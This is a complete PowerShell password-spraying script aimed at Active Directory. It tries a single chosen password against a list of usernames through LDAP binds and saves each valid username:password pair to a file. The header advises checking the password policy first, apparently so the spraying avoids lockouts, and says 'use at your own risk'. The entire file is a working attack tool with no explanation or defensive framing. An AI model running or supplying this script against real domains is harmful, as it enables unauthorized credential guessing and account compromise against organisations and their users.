############ You should first check the password policy before running this script ################
###### Use at your own risk ######

$Password = "<password you want to try>"
$OutFile = "<some path to outfile>"
$UserListArray = Get-Content "<some text file with usernames>"
$Domain = "<specify domain>"
$DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$Domain)
$DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
$CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName

foreach ($User in $UserListArray)
    {

        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password)
        if ($Domain_check.name -ne $null)
        {
            if ($OutFile -ne "")
            {
                Add-Content $OutFile $User`:$Password
            }
            Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
        }

    }
